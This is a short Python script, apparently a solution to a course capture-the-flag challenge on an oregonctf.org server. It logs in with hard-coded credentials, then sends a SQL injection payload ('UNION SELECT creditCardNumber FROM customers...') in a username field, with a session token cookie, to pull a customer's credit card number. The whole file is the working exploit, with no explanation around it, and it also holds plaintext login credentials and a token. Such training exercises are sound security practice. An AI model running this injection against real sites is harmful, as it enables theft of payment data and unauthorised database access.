import requests

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/b7327828a90da59df54b27499c0dc2e875344035e38608fcfb7c1ab8924923f6"

sql = "' UNION SELECT creditCardNumber FROM customers WHERE customername = 'Mary Martin'  #"
postData = {"theUserName":sql}
cookie = {"token":"100148587344234071295966378869981555680"}

response2 = session.post(targetUrl, data=postData, cookies=cookie)

print(response2.text)
